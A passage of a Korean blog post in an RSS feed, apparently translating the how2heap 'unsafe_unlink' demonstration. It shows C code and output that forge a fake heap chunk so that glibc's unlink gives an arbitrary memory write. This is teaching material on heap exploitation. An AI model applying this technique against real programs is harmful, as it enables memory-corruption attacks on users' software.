있다고 하면, chunk1.previous_size는 0x90이 될 것이다.\n"</span></span><br><span class="line"><span class="string">"그러나 이것은 새로운 값이다: %p\n"</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk1의 previous_in_use를 false로 설정하여 free로 fake chunk를 표시한다.\n\n"</span>);</span><br><span class="line">chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 chunk1을 free해서 backward로 consolidate하면 fake chunk와 unlink될 것이고 chunk0_ptr을 overwrite한다\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"unlink 매크로 소스는 해당 링크에서 찾을 수 있다.\n"</span></span><br><span class="line"><span class="string">"https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 때, 우리는 chunk0_ptr을 임의의 위치를 가리키도록 overwrite해서 사용할 수 있다.\n"</span>);</span><br><span class="line"><span class="keyword">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(victim_string,<span class="string">"Hello!~"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk0_ptr은 이제 우리가 원하는 곳을 가리키고 있다. 이것은 victim문자열을 overwrite하는데 사용한다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"원래 값: %s\n"</span>,victim_string);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------chunk0_ptr[0]=0x4141414142424242LL-------"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"바뀐 값: %s\n"</span>,victim_string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><center><small>[unsafe_unlink.c]</small></center><p><img src="https://user-images.githubusercontent.com/16969364/58533188-cb21ce00-8222-11e9-8f58-45c4f5c4657e.png" alt><br><img src="https://user-images.githubusercontent.com/16969364/58533397-5ac77c80-8223-11e9-923e-14828d385b91.PNG" alt><br><img src="https://user-images.githubusercontent.com/16969364/58533399-5b601300-8223-11e9-97f1-676a43e00fdd.PNG" alt></p><p><code>unsafe unlink 2.0!</code><br><code>테스트 환경: Ubuntu 14.04/16.04 64bit</code><br>이 기법은 unlink를 호출할 수 있는 알려진 위치에 포인터가 있을 때 사용할 수 있다.<br>대부분의 시나리오는 overflow를 할 수 있고 전역 포인터를 가지고 있는 취약한 버퍼다.<br>이번 연습의 요점은 임의의 메모리를 쓰기 위해 free를 사용하여 global chunk0_ptr을 corrupt시키는 것이다.</p><p><code>global chunk0_ptr: 0x602070, pointing to 0x603010</code><br><code>corrupt할 victim chunk: 0x6030a0</code></p><p>chunk0에 fake chunk를 생성한다.<br>&amp;chunk0_ptr 근처를 가리키도록 fake chunk의 next_free_chunk(fd)를 설정하여 P-&gt;fd-&gt;bk=P가 되게 한다.<br>&amp;chunk0_ptr 근처를 가리키도록 fake chunk의 previous_free_chunk(bk)를 설정하여 P-&gt;bk-&gt;fd=P가 되게 한다.<br>이 설정을 통해서 우리는 체크를 통과할 수 있다: : (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False<br><code>Fake chunk fd: 0x602058</code><br><code>Fake chunk bk: 0x602060</code></p><p>chunk0에 overflow가 발생한다고 가정한다면 우리는 chunk1의 metadata를 자유롭게 바꿀 수 있다.<br>chunk0의 크기를 줄여서(chunk1에 previous_size가 저장된) free가 chunk0이 fake chunk에 위치한 곳에서 시작한다고 생각할 것이다.<br>fake chunk가 정확히 알려진 포인터가 가리키는 곳에서 시작되고 그에 따라 chunk를 축소하는 것이 중요하다.<br>만약 우리가 일반적으로 free된 chunk0이 있다고 하면, chunk1.previous_size는 <code>0x90</code>이 될 것이다.<br>그러나 이것은 새로운 값이다: <code>0x80</code><br>chunk1의 previous_in_use를 false로 설정하여 free로 fake chunk를 표시한다.</p><p>이제 chunk1을 free해서 backward로 consolidate하면 fake chunk와 unlink될 것이고 chunk0_ptr을 overwrite한다</p><p>이 때, 우리는 chunk0_ptr을 임의의 위치를 가리키도록 overwrite해서 사용할 수 있다.<br>chunk0_ptr은 이제 우리가 원하는 곳을 가리키고 있다. 이것은 victim문자열을 overwrite하는데 사용한다.<br><code>원래 값: Hello!~</code><br><code>-------chunk0_ptr[0]=0x4141414142424242LL-------</code><br><code>바뀐 값: BBBBAAAA</code></p><center><small><p><strong><a href="https://github.com/shellphish/how2heap/blob/master/fastbin_dup.c" target="_blank" rel="noopener">Source</a></strong></p><p></p></small></center><p></p>]]></content:encoded>
-      
-      <comments>http://j0n9hyun.github.io/2019/05/29/theory/How2Heap-unsafe-unlink-c/#disqus_thread</comments>
     </item>
     
   </channel>
